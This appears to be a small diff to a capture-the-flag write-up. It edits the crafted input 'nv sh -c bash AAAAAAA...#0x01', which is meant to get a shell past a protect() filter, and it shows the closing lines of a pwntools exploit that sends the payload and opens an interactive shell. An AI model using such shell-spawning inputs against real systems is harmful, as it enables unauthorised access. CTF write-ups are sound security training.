@@ -124,7 +124,7 @@ After the `protect()` function processes it, it will look like this:
 
 In conclusion, the input should look like this:
 
-`nv sh -c bash AAAAAAA...#/x01`
+`nv sh -c bash AAAAAAA...#0x01`
 
 ## Exploit Code
 
@@ -146,3 +146,4 @@ print(payload)
 p.sendline(payload)
 p.interactive() # cat flag
 ```
+
